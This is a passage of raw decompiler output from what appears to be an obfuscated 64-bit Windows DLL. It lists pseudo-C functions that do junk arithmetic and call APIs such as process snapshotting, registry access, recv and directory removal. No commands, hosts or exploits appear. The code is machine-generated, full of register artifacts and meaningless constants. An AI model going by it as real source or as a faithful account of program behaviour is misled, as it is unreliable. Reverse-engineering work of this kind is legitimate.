null

Logs:
# Decompiled Functions: index 1000-1099

Total requested: 100, succeeded: 100, failed: 0

## Function: FUN_180048ab0 (0x180048ab0)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180048ab0(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong unaff_RBX;
  longlong unaff_RSI;
  ulonglong uVar3;
  ulonglong uVar4;
  
  uVar4 = unaff_RBX + 0x1e + unaff_RSI & 0x915d6e8e;
  uVar3 = (param_3 + 0x13) * uVar4;
  uVar2 = 0;
  _DAT_915d6e66 = 0x180048b37;
  lVar1 = FUN_180006930();
  if (lVar1 != 0) {
    uVar2 = (uVar2 | uVar3) ^ uVar3;
  }
  return (lVar1 + -0xb) - (ulonglong)CARRY8(uVar2,uVar4);
}


```

---

## Function: FUN_180048b78 (0x180048b78)

```c

/* WARNING: Removing unreachable block (ram,0x000180048d42) */

undefined1 * FUN_180048b78(void)

{
  undefined1 local_80 [40];
  ulonglong local_58;
  undefined1 auStack_48 [40];
  
  FUN_18002f648();
  FUN_18003c128();
  return auStack_48 +
         ((ulonglong)local_80 >> 0x1c | 0x2251975e) +
         (ulonglong)((longlong)(((local_58 & 0xc9c811046b60e98f) - 2) * 0x200) < 0);
}


```

---

## Function: FUN_180048dd8 (0x180048dd8)

```c

void FUN_180048dd8(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  ulonglong in_RAX;
  undefined *puVar1;
  ulonglong uVar2;
  ulonglong unaff_RDI;
  ulonglong in_R11;
  ulonglong uVar3;
  
  puVar1 = &DAT_1800ce63a;
  uVar3 = in_R11 | unaff_RDI & in_R11;
  if (((param_3 + 10) * 0x4000 & in_RAX) == 0) {
    uVar3 = uVar3 << 0x1b;
    puVar1 = (undefined *)0x1800ce62d;
  }
  uVar3 = uVar3 | (ulonglong)puVar1 >> 0xc;
  uVar2 = ((ulonglong)puVar1 >> 0xc ^ uVar3) + uVar3;
  FUN_18003cd88();
  if (-1 < (longlong)uVar2) {
    uVar2 = uVar2 & uVar3;
  }
  HeapAlloc(&DAT_1800c7f22,(DWORD)uVar2,0);
  FindFirstFileA(&DAT_1800cad2a,(LPWIN32_FIND_DATAA)0x0);
  FUN_180052618();
  return;
}


```

---

## Function: FUN_180048f78 (0x180048f78)

```c

undefined8 FUN_180048f78(void)

{
  DWORD dwFreeType;
  undefined8 local_d8;
  
  dwFreeType = (DWORD)&DAT_1800c34af;
  FUN_18003d830();
  VirtualFree((LPVOID)0x0,0xfb57bbb97542bb4f,dwFreeType);
  FUN_180016ac0();
  FUN_180038aa8();
  FUN_180043700();
  return local_d8;
}


```

---

## Function: FUN_1800491b8 (0x1800491b8)

```c

void FUN_1800491b8(void)

{
  CHAR local_c0 [160];
  
  FUN_18003fd28();
  RemoveDirectoryA(local_c0);
  FUN_18000ff18();
  FUN_1800560a8();
  return;
}


```

---

## Function: FUN_180049360 (0x180049360)

```c

longlong FUN_180049360(void)

{
  LSTATUS LVar1;
  ulonglong uVar2;
  undefined4 extraout_var;
  undefined1 *puVar3;
  ulonglong uVar4;
  LPCWSTR lpSubKey;
  longlong unaff_RBX;
  ulonglong uVar5;
  ulonglong uVar6;
  longlong lVar7;
  longlong in_R9;
  ulonglong uVar8;
  longlong lVar9;
  ulonglong in_R11;
  longlong unaff_R13;
  PHKEY in_stack_ffffffffffffff18;
  undefined1 local_d0 [40];
  longlong local_a8;
  
  uVar8 = in_R9 + 0x1a;
  FUN_18001f430();
  uVar6 = 0;
  uVar5 = unaff_RBX - 0x16;
  puVar3 = local_d0;
  uVar2 = CreateToolhelp32Snapshot();
  if (uVar2 != 0) {
    uVar4 = (ulonglong)puVar3 ^ unaff_R13 + 0x1aU;
    uVar6 = uVar6 | uVar2;
    uVar2 = uVar2 - uVar6;
    in_R11 = in_R11 + uVar4 | uVar8 | uVar2;
    uVar5 = (uVar5 ^ in_R11) - (uVar4 + 0x11);
  }
  uVar2 = in_R11 >> 0x1a ^ uVar2;
  lVar9 = (uVar8 | uVar5) + 0x1a;
  lpSubKey = (LPCWSTR)0x3e957aa4fd4e3bef;
  uVar5 = FUN_180015be0();
  if (-1 < (longlong)(uVar6 & uVar5)) {
    lVar9 = lVar9 + 0xe;
  }
  lVar7 = local_a8 << 6;
  LVar1 = RegOpenKeyExW((HKEY)0x0,lpSubKey,(DWORD)lVar7,(REGSAM)(lVar9 << 0x18),
                        in_stack_ffffffffffffff18);
  uVar5 = CONCAT44(extraout_var,LVar1) ^ lVar7 - 0x1dU;
  if ((POPCOUNT(lVar7 - 0x1dU & uVar5 & 0xff) & 1U) != 0) {
    uVar5 = uVar5 + uVar2;
  }
  return (longlong)uVar5 >> 1;
}


```

---

## Function: FUN_180049540 (0x180049540)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_180049540(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_R12;
  
  _DAT_1cc1eeb9 = 0x180049583;
  uVar1 = FUN_180055850();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 | unaff_R12;
  }
  return uVar2;
}


```

---

## Function: FUN_1800495c0 (0x1800495c0)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x000180049789) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1800495c0(void)

{
  int unaff_R13D;
  
  FUN_180054a68();
  _DAT_fc08957ef0d5e311 = 0x1800496f9;
  recv(0x1800cba5b,(char *)0x0,-0x7ff2db5f,unaff_R13D + 0xc);
  _DAT_fc08957ef0d5e311 = 0x180049732;
  FUN_180032f68();
  return;
}


```

---

## Function: FUN_180049840 (0x180049840)

```c

undefined8 FUN_180049840(void)

{
  return 0xa549a943;
}


```

---

## Function: FUN_1800498b8 (0x1800498b8)

```c

void FUN_1800498b8(void)

{
  DWORD unaff_ESI;
  PHKEY unaff_R15;
  
  RegOpenKeyExW((HKEY)&stack0xffffffffffffffe8,(LPCWSTR)0x0,unaff_ESI,0x800d41de,unaff_R15);
  FUN_180042880(-0x7ff3fd7e);
  return;
}


```

---

## Function: FUN_180049968 (0x180049968)

```c

LRESULT FUN_180049968(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  ulonglong in_RAX;
  LRESULT LVar1;
  undefined1 *puVar2;
  ulonglong unaff_RBX;
  ulonglong unaff_RDI;
  ulonglong in_R10;
  longlong in_R11;
  longlong unaff_R12;
  LRESULT LVar3;
  longlong unaff_R13;
  undefined1 uStack_9;
  
  puVar2 = &stack0xfffffffffffffff8;
  if ((longlong)(in_RAX | in_R10) < 0) {
    unaff_R12 = unaff_R12 + unaff_R13 + unaff_RDI;
    puVar2 = (undefined1 *)((ulonglong)&uStack_9 ^ unaff_RDI);
    in_R11 = in_R11 << 0xc;
  }
  LVar3 = unaff_R12 * 0x800;
  if (0 < (longlong)(in_R11 + 0x1bU & unaff_RBX)) {
    puVar2 = puVar2 + -(in_R11 + 0x1bU);
  }
  if ((POPCOUNT((ulonglong)puVar2 & 0xff) & 1U) != 0) {
    LVar3 = LVar3 + -0x1e;
    puVar2 = &stack0xfffffffffffffff8;
  }
  LVar1 = SendMessageA((HWND)(puVar2 + 8),0x800c268a,param_3 + 0xe,0);
  if (LVar1 == 0) {
    LVar1 = LVar3;
  }
  return LVar1;
}


```

---

## Function: FUN_180049a60 (0x180049a60)

```c

void FUN_180049a60(void)

{
  return;
}


```

---

## Function: FUN_180049ac8 (0x180049ac8)

```c

/* WARNING: Removing unreachable block (ram,0x000180049bff) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

longlong FUN_180049ac8(undefined8 param_1,longlong param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong in_RAX;
  longlong lVar3;
  ulonglong uVar4;
  ulonglong unaff_RBX;
  longlong lVar5;
  ulonglong unaff_R12;
  int in_stack_ffffffffffffff28;
  int in_stack_ffffffffffffff30;
  UINT in_stack_ffffffffffffff38;
  undefined8 local_80;
  
  lVar3 = in_RAX + 3 + (ulonglong)CARRY8(unaff_RBX,unaff_R12);
  if (param_2 + 0x16 < 0) {
    unaff_R12 = local_80;
  }
  SetWindowPos((HWND)0x1f73fb3958be72fc,
               (HWND)((param_2 + 0x25) * ((ulonglong)(lVar3 >> 0x1e) >> 0x18) + 0x1b),
               (int)(lVar3 >> 0x36),0,in_stack_ffffffffffffff28,in_stack_ffffffffffffff30,
               in_stack_ffffffffffffff38);
  uVar4 = 0xe4777a2508c22393;
  lVar5 = 0;
  lVar3 = FUN_18001bb60();
  uVar2 = (uVar4 >> 0x19) + (lVar5 - 0x1aU);
  uVar4 = (ulonglong)CARRY8(uVar4 >> 0x19,lVar5 - 0x1aU);
  uVar1 = uVar2 - 0x19;
  return ((lVar3 >> 4) + 0x16 >> 0x14) *
         ((uVar1 - uVar4) + 0x14 +
         (ulonglong)
         (unaff_R12 < 0x1e || unaff_R12 - 0x1e < (ulonglong)(uVar2 < 0x19 || uVar1 < uVar4))) * 0x40
  ;
}


```

---

## Function: FUN_180049c88 (0x180049c88)

```c

longlong FUN_180049c88(void)

{
  longlong in_RAX;
  longlong lVar1;
  ulonglong uVar2;
  longlong lVar3;
  longlong unaff_RBX;
  longlong unaff_RSI;
  ulonglong unaff_RDI;
  ulonglong uVar4;
  longlong in_R9;
  undefined1 *puVar5;
  ulonglong in_R11;
  longlong unaff_R12;
  ulonglong uVar6;
  undefined1 auStack_58 [32];
  undefined1 local_38 [32];
  
  uVar2 = in_R9 - 0x1f;
  if ((longlong)unaff_RDI < 1) {
    in_R11 = in_R11 ^ uVar2;
    unaff_RBX = unaff_RBX * 0x40 + unaff_RSI;
    unaff_RDI = unaff_RDI | uVar2 | in_RAX + 6U;
  }
  uVar4 = unaff_RDI + 0x16;
  uVar6 = unaff_R12 * uVar2;
  if ((POPCOUNT(uVar6 & (ulonglong)auStack_58 & 0xff) & 1U) == 0) {
    uVar2 = in_R9 - 0x37;
    unaff_RBX = unaff_RBX - in_R11;
  }
  lVar1 = FUN_1800447c0();
  if (lVar1 == 0) {
    uVar2 = uVar2 + unaff_RBX;
  }
  puVar5 = local_38;
  lVar3 = uVar2 + 0x28;
  lVar1 = FUN_180045470();
  if (lVar1 == 0) {
    uVar4 = (uVar4 & ((uVar6 - 0x13) + lVar3 & (ulonglong)puVar5) + uVar4) << 9;
    puVar5 = (undefined1 *)((ulonglong)puVar5 & uVar4);
  }
  lVar1 = FUN_180010e38();
  if (lVar1 != 0) {
    puVar5 = (undefined1 *)((ulonglong)puVar5 >> 0x16);
    unaff_RBX = unaff_RBX + 4;
  }
  if (-1 < unaff_RBX) {
    puVar5 = (undefined1 *)((ulonglong)(puVar5 + 0x12) ^ (uVar4 | (ulonglong)puVar5));
  }
  uVar2 = FUN_1800199f0();
  if (uVar2 == 0) {
    puVar5 = puVar5 + -((ulonglong)local_38 >> 0x1f);
  }
  FUN_18001f250();
  puVar5 = puVar5 + 0x1e;
  uVar2 = FUN_180022780();
  return ((longlong)(uVar2 | 0xc8a01c8748445993) >> 2) + 0xb +
         (ulonglong)((longlong)puVar5 << 0x15 < 0);
}


```

---

## Function: FUN_180049ef8 (0x180049ef8)

```c

void FUN_180049ef8(void)

{
  FUN_1800506b0();
  return;
}


```

---

## Function: FUN_180049fa0 (0x180049fa0)

```c

ulonglong FUN_180049fa0(void)

{
  longlong in_RAX;
  ulonglong uVar1;
  ulonglong unaff_RSI;
  ulonglong in_R11;
  ulonglong unaff_R13;
  undefined8 local_18;
  
  uVar1 = in_RAX + 0x13;
  if (unaff_RSI != (unaff_RSI & 0x9673279547c7f439) || in_R11 >> 0x14 != 0) {
    uVar1 = uVar1 | local_18 + -0xf + (unaff_R13 >> 8);
  }
  return uVar1;
}


```

---

## Function: FUN_18004a020 (0x18004a020)

```c

void FUN_18004a020(void)

{
  _strnicmp(&DAT_1800cda45,&stack0xffffffffffffffea,0x1800ceac2);
  return;
}


```

---

## Function: FUN_18004a088 (0x18004a088)

```c

void FUN_18004a088(void)

{
  return;
}


```

---

## Function: FUN_18004a118 (0x18004a118)

```c

longlong FUN_18004a118(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_R13;
  
  uVar2 = 0;
  uVar1 = FUN_180038d10();
  return (uVar1 ^ unaff_R13) + (ulonglong)(uVar2 < 0x1e) + 2;
}


```

---

## Function: FUN_18004a180 (0x18004a180)

```c

undefined8 FUN_18004a180(void)

{
  return 0xfffffffffffffff5;
}


```

---

## Function: FUN_18004a1f8 (0x18004a1f8)

```c

/* WARNING: Removing unreachable block (ram,0x00018004a282) */

ulonglong FUN_18004a1f8(void)

{
  int iVar1;
  undefined4 extraout_var;
  ulonglong uVar2;
  UINT unaff_R13D;
  HWND local_48;
  
  iVar1 = MessageBoxW(local_48,(LPCWSTR)0x10fbb15506d6e395,(LPCWSTR)0x0,unaff_R13D);
  uVar2 = 0;
  if (CONCAT44(extraout_var,iVar1) != 0) {
    uVar2 = (ulonglong)((longlong)&local_48->unused + CONCAT44(extraout_var,iVar1)) >> 0x11;
  }
  return (uVar2 - 5) - (ulonglong)(((ulonglong)local_48 >> 0xb & 1) != 0);
}


```

---

## Function: FUN_18004a2b0 (0x18004a2b0)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Type propagation algorithm not settling */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

ulonglong FUN_18004a2b0(longlong param_1)

{
  BOOL BVar1;
  longlong lVar2;
  undefined4 extraout_var;
  undefined1 *puVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  longlong unaff_RDI;
  longlong lVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  ulonglong uVar11;
  undefined1 *puVar12;
  ulonglong uVar13;
  ulonglong unaff_R13;
  ulonglong uVar14;
  ulonglong local_48;
  undefined1 local_30 [16];
  
  uVar4 = param_1 + 0x13;
  lVar7 = unaff_RDI * 0x200;
  uVar9 = (longlong)local_30 >> 0x1c;
  lVar2 = FUN_18000f620();
  if (lVar2 != 0) {
    uVar9 = uVar9 - 0xd;
    lVar7 = lVar7 + -0x1d;
    uVar4 = uVar4 + uVar9;
  }
  puVar12 = local_30;
  uVar5 = 0x5bc20083f926e4a0;
  uVar8 = lVar7 * (longlong)puVar12;
  lVar2 = FUN_18004e0e8();
  if (lVar2 != 0) {
    uVar8 = uVar8 & uVar4;
    local_48 = local_48 + lVar2;
    puVar12 = (undefined1 *)((ulonglong)puVar12 >> 9 & 0x5bc20083f926e4a0);
    uVar9 = uVar9 >> 4 ^ (ulonglong)puVar12;
    uVar5 = unaff_R13 + 0x5bc20083f926e4a0 & unaff_R13;
  }
  uVar4 = uVar8 + (uVar5 | uVar8);
  uVar6 = 0;
  uVar14 = unaff_R13 * 0x200000;
  uVar5 = uVar9 - 3;
  if ((longlong)((ulonglong)puVar12 & uVar8 - local_48) < 1) {
    local_48 = local_48 - (uVar8 - local_48);
    uVar4 = uVar4 & uVar14;
    uVar6 = uVar9 - 3 & uVar4;
    uVar14 = uVar14 + 0x13;
    uVar5 = uVar6;
  }
  uVar5 = uVar5 & (ulonglong)puVar12;
  uVar6 = uVar6 ^ uVar14;
  _DAT_137ede8622b371d0 = 0x18004a3f3;
  FUN_180046280();
  uVar4 = uVar4 ^ uVar5;
  uVar9 = 0xee6e9d462a334a90;
  _DAT_137ede8622b371d0 = 0x18004a411;
  BVar1 = RemoveDirectoryA((LPCSTR)0xee6e9d462a334a90);
  puVar3 = (undefined1 *)0x0;
  if (CONCAT44(extraout_var,BVar1) != 0) {
    puVar12 = (undefined1 *)((ulonglong)puVar12 & uVar5);
    uVar14 = uVar14 + uVar5;
    puVar3 = &DAT_137ede8622b37200;
    uVar4 = uVar4 | 0x137ede8622b37200;
  }
  uVar14 = uVar14 - 0xd;
  uVar10 = uVar5 - uVar6 & local_48;
  uVar13 = (local_48 & uVar10) + 0x19 | (longlong)puVar12 - uVar4;
  uVar5 = 0x2479357ae369e9eb;
  uVar8 = (longlong)puVar12 - uVar4;
  if ((longlong)(uVar10 & uVar9) < 1) {
    uVar4 = uVar4 + (longlong)(puVar3 + uVar6 + 0x18);
    uVar14 = uVar14 & uVar13;
    uVar10 = uVar10 & uVar4;
    uVar5 = _DAT_137ede8622b37208;
    uVar8 = _DAT_137ede8622b37208;
  }
  uVar11 = uVar10 + 0x1e | 0x137ede8622b37208;
  uVar5 = ((uVar6 * (uVar5 & uVar13 ^ uVar8 & uVar4) & uVar11) - uVar14 * (uVar10 + 0x1e)) +
          0x137ede8622b3721e;
  if (((uVar11 + 0x12) - (uVar4 * uVar6 + -0xe) & uVar9) != 0) {
    uVar5 = uVar5 & 0x137ede8622b37200;
  }
  return uVar5;
}


```

---

## Function: FUN_18004a548 (0x18004a548)

```c

longlong FUN_18004a548(void)

{
  ulonglong in_RAX;
  longlong lVar1;
  HANDLE pvVar2;
  undefined *puVar3;
  ulonglong *lpFileName;
  longlong unaff_RBX;
  ulonglong unaff_RSI;
  ulonglong uVar4;
  undefined1 *unaff_RDI;
  ulonglong uVar5;
  longlong in_R10;
  longlong lVar6;
  ulonglong in_R11;
  longlong unaff_R13;
  ulonglong local_c0 [8];
  undefined1 local_80 [96];
  
  lVar1 = FUN_180011dc0();
  if (lVar1 != 0) {
    in_R11 = in_R11 ^ unaff_RSI;
    unaff_R13 = (unaff_R13 - (longlong)unaff_RDI) + 10;
    unaff_RDI = local_80;
  }
  uVar4 = 0;
  lVar6 = ((in_R10 - in_R11 | (longlong)unaff_RDI - unaff_R13) - 0x19) * 0x200;
  puVar3 = &DAT_1800c81ca;
  lVar1 = FUN_180001820();
  if (lVar1 == 0) {
    local_c0[0] = (local_c0[0] ^ in_RAX) - in_R11;
    uVar4 = -in_R11;
    in_RAX = in_RAX ^ (ulonglong)puVar3;
  }
  lpFileName = local_c0;
  pvVar2 = FindFirstFileA((LPCSTR)lpFileName,(LPWIN32_FIND_DATAA)0xd33c5edeb43ea4d8);
  if (pvVar2 == (HANDLE)0x0) {
    in_RAX = in_RAX & in_R11;
    local_c0[0] = local_c0[0] << 0x12;
    lpFileName = (ulonglong *)(((ulonglong)lpFileName & in_RAX) - unaff_RBX);
    pvVar2 = (HANDLE)0x0;
    uVar4 = uVar4 + unaff_RBX & lVar6 - 0x1aU;
  }
  lVar1 = (longlong)(in_RAX & (ulonglong)lpFileName) >> 0x1e;
  uVar5 = ((ulonglong)((longlong)pvVar2 + 1U < local_c0[0] * unaff_RBX) + 0xa3e15eeb) -
          ((ulonglong)lpFileName >> 0xb);
  return uVar4 + 2 +
         (ulonglong)
         ((((longlong)pvVar2 + 1U) - local_c0[0] * unaff_RBX) - 0x1e <
         (uVar5 + lVar1 * -0x40 + -0xc) - (ulonglong)(uVar5 < (ulonglong)(lVar1 * 0x40)) >> 8);
}


```

---

## Function: FUN_18004a6e8 (0x18004a6e8)

```c

undefined8 FUN_18004a6e8(void)

{
  RemoveDirectoryA((LPCSTR)0x0);
  FUN_180044bf0();
  FUN_180054050();
  FUN_18001da50();
  return 0;
}


```

---

## Function: FUN_18004a910 (0x18004a910)

```c

/* WARNING: Removing unreachable block (ram,0x00018004aab8) */

undefined1 * FUN_18004a910(void)

{
  longlong lVar1;
  undefined1 *puVar2;
  ulonglong unaff_RBX;
  undefined *puVar3;
  longlong in_R11;
  ulonglong uVar4;
  undefined1 local_138 [72];
  undefined8 uStack_f0;
  undefined1 local_b0 [65];
  undefined1 auStack_6f [87];
  
  uVar4 = in_R11 * (longlong)local_138;
  puVar2 = local_b0;
  puVar3 = &DAT_1800c028a;
  uStack_f0 = 0x18004a972;
  lVar1 = CreateToolhelp32Snapshot();
  uStack_f0 = 0x18004a9bd;
  FUN_180002a28(0x1e,(longlong)puVar2 * 0x400000 + -0x1e,
                (ulonglong)(puVar3 + (unaff_RBX | (ulonglong)puVar2) + lVar1) ^ uVar4);
  return auStack_6f;
}


```

---

## Function: FUN_18004ab00 (0x18004ab00)

```c

/* WARNING: Type propagation algorithm not settling */

longlong FUN_18004ab00(void)

{
  ulonglong uVar1;
  longlong lVar2;
  ulonglong uVar3;
  ulonglong unaff_RDI;
  undefined *puVar4;
  undefined *puVar5;
  undefined1 *puVar6;
  longlong lVar7;
  longlong in_R10;
  longlong lVar8;
  longlong in_R11;
  undefined1 *puVar9;
  undefined1 *puVar10;
  ulonglong unaff_R12;
  undefined1 *puVar11;
  ulonglong uVar12;
  ulonglong unaff_R13;
  undefined1 *puVar13;
  undefined1 local_170 [5];
  undefined1 auStack_16b [107];
  undefined8 uStack_100;
  longlong local_c0;
  undefined1 local_b0 [8];
  undefined1 local_a8 [32];
  undefined1 local_88 [8];
  ulonglong local_80;
  
  puVar5 = &DAT_1800d4c86;
  puVar9 = (undefined1 *)(in_R11 >> 0x1d);
  puVar4 = &DAT_1800c0ecb;
  uStack_100 = 0x18004ab45;
  uVar1 = FUN_180023230();
  if (uVar1 == 0) {
    uVar1 = unaff_R13 & (ulonglong)puVar4;
    puVar4 = puVar4 + (longlong)puVar5;
    unaff_R12 = unaff_R12 & uVar1;
    puVar9 = local_88;
    uVar1 = (ulonglong)puVar4 ^ (ulonglong)puVar9;
  }
  uVar1 = in_R10 + uVar1;
  puVar10 = (undefined1 *)((unaff_RDI - 0x16) - (ulonglong)CARRY8(unaff_RDI,(ulonglong)puVar9));
  puVar9 = puVar9 + ((unaff_RDI - 9) - (ulonglong)((uVar1 >> 6 & 1) != 0));
  puVar11 = (undefined1 *)((unaff_R12 - 5) - (ulonglong)((longlong)puVar4 << 0xd < 0));
  puVar13 = local_170;
  uStack_100 = 0x18004abb7;
  lVar2 = FUN_18004ecd0();
  if (lVar2 == 0) {
    puVar13 = auStack_16b;
    puVar11 = local_88;
    puVar10 = puVar10 + (longlong)puVar11;
    uVar1 = local_80;
  }
  puVar6 = local_b0;
  uStack_100 = 0x18004abf4;
  lVar2 = FUN_18003a788();
  uVar3 = 0;
  if (lVar2 != 0) {
    puVar11 = (undefined1 *)((ulonglong)puVar11 & uVar1);
    puVar9 = (undefined1 *)((longlong)puVar9 * 0x20);
    puVar10 = (undefined1 *)((ulonglong)puVar10 ^ uVar1);
    uVar3 = lVar2 - (longlong)puVar6 ^ (ulonglong)puVar13;
  }
  uVar12 = (ulonglong)puVar11 | uVar3;
  uVar1 = (longlong)local_a8 *
          (longlong)(puVar6 + uVar12 + (ulonglong)(((ulonglong)puVar6 >> 0x3e & 1) != 0) + 3);
  if ((POPCOUNT(((ulonglong)puVar13 >> 0x16) - ((ulonglong)puVar9 ^ (ulonglong)puVar11) &
                (ulonglong)&stack0xfffffffffffffff8 & 0xff) & 1U) == 0) {
    uVar3 = uVar3 >> 8;
  }
  uVar3 = (ulonglong)(puVar6 + uVar12 + (ulonglong)(((ulonglong)puVar6 >> 0x3e & 1) != 0) + 3) |
          uVar3;
  lVar2 = uVar3 - uVar1;
  lVar7 = lVar2 + 9;
  lVar8 = uVar1 + lVar7;
  uVar12 = (lVar2 + 0x1a7 + lVar8) * 4;
  return (longlong)
         (uVar12 + ((lVar7 + ((longlong)
                              (puVar10 + (-7 - (ulonglong)(((ulonglong)puVar13 >> 0x15 & 1) != 0)))
                              * local_c0 - (-4 - (ulonglong)(uVar3 < uVar1)) >> 0x15) + lVar8) -
                    0x1a ^ uVar12) + 0x18) >> 0x1c;
}


```

---

## Function: FUN_18004ad38 (0x18004ad38)

```c

undefined8 FUN_18004ad38(void)

{
  BOOL BVar1;
  longlong lVar2;
  undefined4 extraout_var;
  ulonglong uVar3;
  WNDENUMPROC lpEnumFunc;
  ulonglong uVar4;
  longlong unaff_RBX;
  ulonglong uVar5;
  ulonglong unaff_RSI;
  ulonglong uVar6;
  longlong unaff_RDI;
  ulonglong uVar7;
  ulonglong in_R9;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong in_R11;
  undefined1 local_28 [8];
  
  uVar3 = 0x10392f130ef50da0;
  uVar8 = in_R9 + 0x10;
  uVar7 = unaff_RDI + 4 + (ulonglong)(0xffffffffffffffef < in_R9);
  uVar4 = 0xfffffffffffffffa;
  uVar6 = unaff_RSI ^ 0x10392f130ef50da0;
  uVar5 = unaff_RBX + uVar6;
  uVar9 = (ulonglong)local_28 ^ uVar5;
  lVar2 = FUN_18001c280();
  if (lVar2 == 0) {
    uVar7 = uVar7 & in_R11;
    uVar8 = (uVar8 | uVar9) & uVar5;
    in_R11 = in_R11 - uVar6;
    uVar7 = uVar7 >> 2;
  }
  uVar9 = uVar9 + uVar6;
  if ((longlong)(uVar7 + uVar8) < 1) {
    uVar3 = ((uVar3 & uVar4) - in_R11) + uVar5;
  }
  lpEnumFunc = (WNDENUMPROC)(uVar3 + 10);
  lVar2 = 0x6e1e4f70b6e98171;
  BVar1 = EnumWindows(lpEnumFunc,0x6e1e4f70b6e98171);
  if (CONCAT44(extraout_var,BVar1) != 0) {
    lpEnumFunc = (WNDENUMPROC)((ulonglong)lpEnumFunc | uVar9);
  }
  if (-1 < lVar2) {
    lpEnumFunc = (WNDENUMPROC)local_28;
  }
  FUN_180024ef0((longlong)(lpEnumFunc + CONCAT44(extraout_var,BVar1) + 0x24),0,(longlong)local_28);
  return 0x31138a81;
}


```

---

## Function: FUN_18004af08 (0x18004af08)

```c

longlong FUN_18004af08(void)

{
  ulonglong uVar1;
  undefined1 local_58 [32];
  ulonglong local_38;
  
  FUN_18000b218();
  FUN_18004af08();
  FUN_180050940();
  uVar1 = (longlong)local_58 * 0x4000;
  if (local_38 - 0x26 != (ulonglong)(local_38 < 0x16)) {
    uVar1 = ((ulonglong)local_58 & 0x3ffffffffffff) >> 0xb;
  }
  return uVar1 + 0x16;
}


```

---

## Function: FUN_18004b128 (0x18004b128)

```c

undefined8 FUN_18004b128(void)

{
  return 0x261fdb86edbcd5c5;
}


```

---

## Function: FUN_18004b190 (0x18004b190)

```c

longlong FUN_18004b190(void)

{
  longlong lVar1;
  
  lVar1 = FUN_180035188();
  return lVar1 + -0x10;
}


```

---

## Function: FUN_18004b210 (0x18004b210)

```c

/* WARNING: Removing unreachable block (ram,0x00018004b3d2) */

void FUN_18004b210(undefined8 param_1,undefined8 param_2,ulonglong param_3,longlong param_4)

{
  longlong unaff_RBX;
  ulonglong unaff_RBP;
  longlong unaff_RDI;
  longlong in_R10;
  longlong lVar1;
  longlong unaff_R13;
  CHAR local_50 [32];
  
  lVar1 = in_R10 + -0x3136024f4c21e30b;
  if ((unaff_R13 + unaff_RBX & unaff_RBP) == 0) {
    lVar1 = lVar1 + ((param_4 + 5) - unaff_R13 | param_3) * -0x20 + 0x3136024f4c21e30b;
  }
  RemoveDirectoryA(local_50);
  TranslateMessage((MSG *)(lVar1 + unaff_RDI + -10));
  RemoveDirectoryA((LPCSTR)0x0);
  return;
}


```

---

## Function: FUN_18004b448 (0x18004b448)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined1 * FUN_18004b448(undefined8 param_1,undefined8 param_2,longlong param_3)

{
  undefined8 uVar1;
  longlong lVar2;
  ulonglong unaff_RBX;
  ulonglong uVar3;
  undefined1 local_40 [16];
  
  uVar1 = 0x832a2cfcd;
  lVar2 = ((ulonglong)local_40 ^ unaff_RBX) + 0x13;
  uVar3 = param_3 + 0xe;
  FUN_180014c88();
  FUN_18004cbc0(uVar1,lVar2,uVar3);
  FUN_180045760();
  RemoveDirectoryA((LPCSTR)0x9a6b352396f21c4);
  FUN_180030ac8();
  uVar3 = 0x790918b13e66ab85;
  _DAT_790918b13e66ab3d = 0x18004b624;
  FUN_180047af0();
  return &DAT_790918b13e66ab75 + (uVar3 >> 6);
}


```

---

## Function: FUN_18004b700 (0x18004b700)

```c

/* WARNING: This function may have set the stack pointer */
/* WARNING: Removing unreachable block (ram,0x00018004b93e) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_18004b700(void)

{
  PHKEY in_stack_ffffffffffffffc8;
  HKEY__ local_30 [2];
  WCHAR local_28 [8];
  
  RegOpenKeyExW(local_30,local_28,0x800c044a,(REGSAM)local_30,in_stack_ffffffffffffffc8);
  FUN_18004e030();
  FUN_18000e098();
  _DAT_9d8c57cc = 0x18004b873;
  FUN_18000de70();
  FUN_180016078();
  return;
}


```

---

## Function: FUN_18004b968 (0x18004b968)

```c

undefined8 FUN_18004b968(void)

{
  longlong lVar1;
  longlong unaff_RBX;
  FILE *_File;
  ulonglong uVar2;
  longlong in_R11;
  ulonglong uVar3;
  
  uVar3 = in_R11 * unaff_RBX;
  uVar2 = 0;
  lVar1 = FUN_180014040();
  if (lVar1 != 0) {
    uVar2 = uVar2 + lVar1 + 8;
  }
  _File = (FILE *)(uVar3 ^ uVar2);
  lVar1 = FUN_180012d30();
  if (lVar1 == 0) {
    _File = (FILE *)0x0;
  }
  FUN_180003a90();
  fflush(_File);
  return 0;
}


```

---

## Function: FUN_18004bb88 (0x18004bb88)

```c

/* WARNING: Removing unreachable block (ram,0x00018004bcb9) */
/* WARNING: Removing unreachable block (ram,0x00018004bd02) */

longlong FUN_18004bb88(void)

{
  longlong lVar1;
  longlong local_48;
  
  FUN_18002a980(-0x652a732466e25425);
  lVar1 = FUN_180007ea0();
  if (lVar1 == 0) {
    lVar1 = local_48;
  }
  return lVar1;
}


```

---

## Function: FUN_18004bdd8 (0x18004bdd8)

```c

void FUN_18004bdd8(undefined8 param_1,longlong param_2)

{
  FUN_18004ffe0(&DAT_1800c2ac7,param_2 + 0x13);
  return;
}


```

---

## Function: FUN_18004c000 (0x18004c000)

```c

undefined1 * FUN_18004c000(void)
